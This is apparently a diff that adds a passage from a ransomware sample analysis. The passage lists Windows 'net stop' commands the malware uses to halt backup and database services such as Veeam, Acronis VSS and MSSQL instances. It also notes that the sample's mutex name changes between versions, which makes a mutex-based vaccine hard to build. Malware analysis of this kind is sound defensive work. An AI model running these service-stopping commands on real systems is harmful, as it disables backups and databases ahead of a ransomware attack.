@@ -1,0 +1,8 @@
+
+net stop RESvc /y net stop “Acronis VSS Provider” /y
+net stop MSSQL$VEEAMSQL2008R2 /y net stop MSSQLFDLauncher$SHAREPOINT /y
+net stop “SQLsafe Filter Service” /y
+net stop MSSQL$PROD /y net stop SQLAgent$PROD /y
+net stop MSOLAP$TPS /y net stop VeeamDeploySvc /y net stop MSSQLServerOLAPService /y
+The next change is the mutex name.
+In this version it is “HappyLife^_-“, so, can it be complex to make a vaccine based on the mutex name because it can be changed easily in each new sample.
